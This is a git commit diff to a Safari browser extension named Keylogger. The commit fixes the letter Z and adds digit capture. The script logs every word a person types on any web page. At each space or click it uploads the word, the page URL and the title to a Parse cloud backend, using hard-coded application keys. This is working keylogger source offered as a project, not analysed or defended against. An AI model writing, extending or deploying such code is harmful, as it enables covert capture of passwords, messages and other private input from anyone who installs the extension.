5f905bce8d78389a4605a09c8da276a6541a44ad
kirshapps <kirshapps@gmail.com>
2015-04-03 17:46:04 -0400

    Update to Keylogger.JS
    Fixed issue with letter Z. Added support for numbers.

--- Keylogger.safariextension/keylogger.js
+++ Keylogger.safariextension/keylogger.js
@@ -1,10 +1,18 @@
-var keys = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
+var keys = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z', '0','1','2','3','4','5','6','7','8','9'];
+var currentKeyIndex;
 var dict = {};
-for (var x = 65; x < 90; x++) {
-  var currentKeyIndex = x - 65;
+for (var x = 65; x < 91; x++) {
+  currentKeyIndex = x - 65;
   var currentKey = keys[currentKeyIndex];
   dict[x] = currentKey;
 }
+for (var x = 48; x < 58; x++) {
+   currentKeyIndex = x - 22;
+   var currentKey = keys[currentKeyIndex];
+   dict[x] = currentKey;
+}
+
+console.log(dict);
 
 $(document).ready(function(){
     var wordArray = [];
@@ -14,17 +22,21 @@ $(document).ready(function(){
     Parse.initialize("I727vHwPf3qBNX6fEoy1X4nPCbzixCy9NoWMGXZQ", "1f22sRsB0gYTfd49lobej7raEYL4Nc5ViCOjB8Ue");
     var Keylogger = Parse.Object.extend("Keylogger");
     $(document).click(function() {
-                        var currentKeylogger = new Keylogger();
+            if (wordArray.length === 0) {
+                
+            }
+            else {
+            var currentKeylogger = new Keylogger();
 
-       currentWord = wordArray.join('');
+            currentWord = wordArray.join('');
             currentKeylogger.set("site", document.URL);
             currentKeylogger.set("Title", document.title);
             currentKeylogger.set("Word", currentWord);
             currentKeylogger.save(null, {
-  success: function(currentKeylogger) {
+    success: function(currentKeylogger) {
       
   },
-  error: function(currentKeylogger, error) {
+    error: function(currentKeylogger, error) {
       
   }
 });
@@ -32,9 +44,14 @@ $(document).ready(function(){
             currentWord = '';
             wordArray = [];
             lettersTyped = 0;
+            }
     });
     $(document).keyup(function(event){ 
         if (event.which === 32) {
+            if (wordArray.length === 0) {
+                
+            }
+            else {
             var currentKeylogger = new Keylogger();
 
             currentWord = wordArray.join('');
@@ -53,6 +70,7 @@ $(document).ready(function(){
             currentWord = '';
             wordArray = [];
             lettersTyped = 0;
+            }
         }
         else {
         wordArray[lettersTyped] = dict[event.which];
